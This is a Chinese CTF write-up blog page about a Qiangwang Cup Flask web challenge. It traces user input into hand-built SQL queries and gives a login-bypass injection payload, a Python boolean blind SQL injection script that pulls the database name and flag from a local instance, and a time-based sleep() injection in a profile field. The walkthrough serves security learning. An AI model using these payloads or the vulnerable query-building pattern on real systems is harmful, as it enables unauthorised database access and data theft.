@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>QWB_python_wp | Altm4nz</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="keywords" content="wp" />
+  
+  
+  
+  
+  <meta name="description" content="前言通过强网杯的python题目对基于flask框架的pythonweb学习。">
+<meta name="keywords" content="wp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="QWB_python_wp">
+<meta property="og:url" content="http:&#x2F;&#x2F;altman.vip&#x2F;2018&#x2F;05&#x2F;10&#x2F;QWB-python-wp&#x2F;index.html">
+<meta property="og:site_name" content="Altm4nz">
+<meta property="og:description" content="前言通过强网杯的python题目对基于flask框架的pythonweb学习。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-07-31T06:03:12.000Z">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Altm4nz" type="application/atom+xml">
+  
+  <link rel="icon" href="/css/images/pokemon.ico">
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link href="https://fonts.googleapis.com/css?family=Open+Sans|Montserrat:700" rel="stylesheet" type="text/css">
+  <link href="https://fonts.googleapis.com/css?family=Roboto:400,300,300italic,400italic" rel="stylesheet" type="text/css">
+  <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+  <style type="text/css">
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/9749f0/00000000000000000001008f/27/l?subset_id=2&fvd=n5) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/90cf9f/000000000000000000010091/27/l?subset_id=2&fvd=n7) format("woff2");font-weight:500;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/8a5494/000000000000000000013365/27/l?subset_id=2&fvd=n4) format("woff2");font-weight:lighter;font-style:normal;}
+    @font-face{font-family:futura-pt;src:url(https://use.typekit.net/af/d337d8/000000000000000000010095/27/l?subset_id=2&fvd=i4) format("woff2");font-weight:400;font-style:italic;}</style>
+    
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Yanone+Kaffeesatz%3A200%2C300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+
+  <link rel="stylesheet" id="athemes-headings-fonts-css" href="//fonts.googleapis.com/css?family=Oswald%3A300%2C400%2C700&amp;ver=4.6.1" type="text/css" media="all">
+  <link rel="stylesheet" href="/css/style.css">
+
+  <script src="/js/jquery-3.1.1.min.js"></script>
+
+  <!-- Bootstrap core CSS -->
+  <link rel="stylesheet" href="/css/bootstrap.css" >
+  <link rel="stylesheet" href="/css/fashion.css" >
+  <link rel="stylesheet" href="/css/glyphs.css" >
+
+</head>
+
+
+
+  <body data-spy="scroll" data-target="#toc" data-offset="50">
+
+
+  
+
+
+<header id="allheader" class="site-header" role="banner" 
+   >
+  <div class="clearfix container">
+      <div class="site-branding">
+
+          <h1 class="site-title">
+            
+              <a href="/" title="Altm4nz" rel="home"> Altm4nz </a>
+            
+          </h1>
+          
+          
+            
+          <nav id="main-navigation" class="main-navigation" role="navigation">
+            <a class="nav-open">Menu</a>
+            <a class="nav-close">Close</a>
+
+            <div class="clearfix sf-menu">
+              <ul id="main-nav" class="menu sf-js-enabled sf-arrows"  style="touch-action: pan-y;">
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/">Home</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/archives">Archives</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/tags">Tags</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/friend">friend</a> </li>
+                    
+                      <li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-1663"> <a class="" href="/about">About</a> </li>
+                    
+              </ul>
+            </div>
+          </nav>
+
+      </div>
+  </div>
+</header>
+
+
+  <div id="container">
+    <div id="wrap">
+            
+      <div id="content" class="outer">
+        
+          <section id="main" style="float:none;"><article id="post-QWB-python-wp" style="width: 66%; float:left;" class="article article-type-post" itemscope itemprop="blogPost" >
+  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="thumb" class="article-title" itemprop="name">
+      QWB_python_wp
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-meta">
+      
+	<a href="/2018/05/10/QWB-python-wp/" class="article-date">
+	  <time datetime="2018-05-10T07:32:35.000Z" itemprop="datePublished">May 10, 2018</time>
+	</a>
+
+       
+      
+	<span id="busuanzi_container_page_pv">
+	  本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+	</span>
+
+    </div>
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>通过强网杯的python题目对基于flask框架的pythonweb学习。</p>
+<a id="more"></a>
+<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>先看一下路由文件route.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.teardown_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shutdown_session</span><span class="params">(exception=None)</span>:</span></span><br><span class="line">    db_session.remove()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="meta">@app.route('/index', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/explore')</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">explore</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/logout')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/register', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/user/&lt;username&gt;')</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">user</span><span class="params">(username)</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/edit_profile', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_profile</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/follow/&lt;username&gt;')</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">follow</span><span class="params">(username)</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/unfollow/&lt;username&gt;')</span></span><br><span class="line"><span class="meta">@login_required</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unfollow</span><span class="params">(username)</span>:</span></span><br></pre></td></tr></table></figure>
+
+<p>我们先定位到容易出问题的登录注册功能。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/login', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'index'</span>))</span><br><span class="line">    form = LoginForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        user = load_user_by_username(form.username.data)</span><br><span class="line">        <span class="keyword">if</span> user == <span class="number">-1</span>:</span><br><span class="line">            flash(<span class="string">'Something error!'</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">'500.html'</span>), <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> user == <span class="number">0</span>:</span><br><span class="line">            flash(<span class="string">'Invalid username or password'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line">        login_user(user, remember=form.remember_me.data)</span><br><span class="line">        next_page = request.args.get(<span class="string">'next'</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> next_page <span class="keyword">or</span> url_parse(next_page).netloc != <span class="string">''</span>:</span><br><span class="line">            next_page = url_for(<span class="string">'index'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(next_page)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>, title=<span class="string">'Sign In'</span>, form=form)</span><br></pre></td></tr></table></figure>
+
+<p>login页面将username传入了load_user_by_username函数，跟进一下load_user_by_username函数</p>
+<p>定位在models.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_user_by_username</span><span class="params">(username)</span>:</span></span><br><span class="line">    msg = mysql.One(<span class="string">"user"</span>, &#123;<span class="string">"username"</span>: <span class="string">"'%s'"</span> % username&#125;)</span><br><span class="line">    <span class="keyword">if</span> msg != <span class="number">0</span> <span class="keyword">and</span> msg != <span class="number">-1</span>:</span><br><span class="line">        user = User(id=msg[<span class="number">0</span>], username=msg[<span class="number">1</span>], email=msg[<span class="number">2</span>],</span><br><span class="line">                    password_hash=msg[<span class="number">3</span>], note=msg[<span class="number">4</span>], last_seen=msg[<span class="number">5</span>])</span><br><span class="line">        <span class="keyword">return</span> user</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> msg</span><br></pre></td></tr></table></figure>
+
+<p>将username传入了mysql.one函数里</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">One</span><span class="params">(self, tablename, where=&#123;&#125;, feildname=[<span class="string">"*"</span>], order=<span class="string">""</span>, where_symbols=<span class="string">"="</span>, l=<span class="string">"and"</span>)</span>:</span></span><br><span class="line">    sql = self.Sel(tablename, where, feildname, order, where_symbols, l)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = self.db_session.execute(sql).fetchone()</span><br><span class="line">        <span class="keyword">if</span> res == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span></span><br></pre></td></tr></table></figure>
+
+<p>最终进入Sel函数，拼接出语句。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span><span class="built_in"> user </span>where username = <span class="string">'altman'</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试注入，输入用户名</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">altman' or <span class="number">1</span>=<span class="number">1</span>#</span><br></pre></td></tr></table></figure>
+
+<p>成功注入，任意登录。接下来就简单了，写脚本进行bool盲注。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># -*- author:altman -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line">url=<span class="string">'http://127.0.0.1:5000/login'</span></span><br><span class="line">url2=<span class="string">'http://127.0.0.1:5000/logout'</span></span><br><span class="line">cookie=&#123;</span><br><span class="line">    <span class="string">'session'</span>:<span class="string">'f4589153-2c4a-4c80-b97b-b3fdf3506d65'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        requests.get(url=url2, cookies=cookie)</span><br><span class="line">        x = requests.get(url=url, cookies=cookie)</span><br><span class="line">        csrf_token_re = <span class="string">r'&lt;input id="csrf_token" name="csrf_token" type="hidden" value="(.*?)"&gt;'</span></span><br><span class="line">        token = re.findall(csrf_token_re, x.content)[<span class="number">0</span>]</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'username'</span>: <span class="string">"a' or ascii(substr(database(),%d,1))=%d#"</span>%(i,j),</span><br><span class="line">           <span class="comment">#'username': "a' or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))=%d#"%(i,j),</span></span><br><span class="line">            <span class="string">'password'</span>: <span class="string">'asd'</span>,</span><br><span class="line">            <span class="string">'csrf_token'</span>: token</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url=url, data=data, cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'Invalid username or password'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.content:</span><br><span class="line">            flag+=chr(j)</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">注入得到数据库的flag ： QWB&#123;us1ng_val1dator_caut1ous&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ps：其实这个登录函数并没有接受密码，他只检测了用户名是否存在。如果存在就判断登入。</p>
+<p>继续分析查看profile页面</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_profile</span><span class="params">()</span>:</span></span><br><span class="line">    form = EditProfileForm(current_user.username)</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        current_user.username = form.username.data</span><br><span class="line">        current_user.note = form.note.data</span><br><span class="line">        res = mysql.Mod(<span class="string">"user"</span>, &#123;<span class="string">"id"</span>: current_user.id&#125;, &#123;</span><br><span class="line">                        <span class="string">"username"</span>: <span class="string">"'%s'"</span> % current_user.username, <span class="string">"note"</span>: <span class="string">"'%s'"</span> % current_user.note&#125;)</span><br><span class="line">        <span class="keyword">if</span> res != <span class="number">0</span>:</span><br><span class="line">            flash(<span class="string">'Your changes have been saved.'</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'edit_profile'</span>))</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        form.username.data = current_user.username</span><br><span class="line">        form.note.data = current_user.note</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'edit_profile.html'</span>, title=<span class="string">'Edit Profile'</span>,</span><br><span class="line">                           form=form)</span><br></pre></td></tr></table></figure>
+
+<p>新建一个Editprofileform类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">EditProfileForm</span><span class="params">(FlaskForm)</span>:</span></span><br><span class="line">    username = StringField(<span class="string">'Username'</span>, validators=[DataRequired()])</span><br><span class="line">    note = StringField(<span class="string">'About me'</span>, validators=[])</span><br><span class="line">    submit = SubmitField(<span class="string">'Submit'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, original_username, *args, **kwargs)</span>:</span></span><br><span class="line">        super(EditProfileForm, self).__init__(*args, **kwargs)</span><br><span class="line">        self.original_username = original_username</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_username</span><span class="params">(self, username)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">"^[a-zA-Z0-9_]+$"</span>, username.data) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">'username has invalid charactor!'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> username.data == current_user.username:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user = mysql.One(</span><br><span class="line">                <span class="string">"user"</span>, &#123;<span class="string">"username"</span>: <span class="string">"'%s'"</span> % username.data&#125;, [<span class="string">"id"</span>])</span><br><span class="line">            <span class="keyword">if</span> user != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">raise</span> ValidationError(<span class="string">'Please use a different username.'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">validate_note</span><span class="params">(self, note)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> re.match(<span class="string">"^[a-zA-Z0-9_\'\(\) \.\_\*\`\-\@\=\+\&gt;\&lt;]*$"</span>, note.data) == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValidationError(<span class="string">"Don't input invalid charactors!"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这个类会对接受的参数进行过滤，但是我发现对note的过滤及其松散，尝试在note出进行注入。</p>
+<p>由于没有回显，尝试延时注入</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">123</span><span class="string">' and sleep(5) and '</span><span class="keyword">a</span><span class="string">'='</span><span class="keyword">a</span></span><br></pre></td></tr></table></figure>
+
+<p>成功闭合造成延时。</p>
+
+      
+    </div>
+    <footer class="entry-meta entry-footer">
+      
+      
+  <span class="ico-tags"></span>
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+      
+    </footer>
+    <hr class="entry-footer-hr">
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2018/05/13/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E5%A4%A7%E8%B5%9B/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          网络空间安全技术大赛
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/05/01/redhat2018-writeup/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">redhat2018-writeup</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+<!-- Table of Contents -->
+
+  <aside id="sidebar">
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Contents</strong>
+    
+      <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#源码分析"><span class="nav-number">2.</span> <span class="nav-text">源码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SQL注入"><span class="nav-number">2.1.</span> <span class="nav-text">SQL注入</span></a></li></ol></li></ol>
+    
+    </div>
+  </aside>
+
+</section>
+        
+      </div>
+
+    </div>
+    <!-- <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/tags" class="mobile-nav-link">Tags</a>
+  
+    <a href="/friend" class="mobile-nav-link">Friend</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+</nav> -->
+    <footer id="footer" class="site-footer">
+  
+
+  <div class="clearfix container">
+      <div class="site-info">
+	      &copy; 2019 Altm4nz All Rights Reserved.
+        
+            <span id="busuanzi_container_site_uv">  
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+            </span>
+          
+      </div>
+      <div class="site-credit">
+        Theme by <a href="https://github.com/iTimeTraveler/hexo-theme-hipaper" target="_blank">hipaper</a>
+      </div>
+  </div>
+</footer>
+
+
+<!-- min height -->
+
+<script>
+    var wrapdiv = document.getElementById("wrap");
+    var contentdiv = document.getElementById("content");
+
+    wrapdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+    contentdiv.style.minHeight = document.body.offsetHeight - document.getElementById("allheader").offsetHeight - document.getElementById("footer").offsetHeight + "px";
+
+
+    <!-- headerblur min height -->
+    
+    
+</script>
+    
+<div style="display: none;">
+  <script src="https://s11.cnzz.com/z_stat.php?id=1260716016&web_id=1260716016" language="JavaScript"></script>
+</div>
+
+<!-- mathjax config similar to math.stackexchange -->
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+      processEscapes: true
+    }
+  });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+<script src="/js/bootstrap.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+
+
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+
+  </div>
+
+  <a id="rocket" href="#top" class=""></a>
+  <script type="text/javascript" src="/js/totop.js" async=""></script>
+</body>
+</html>
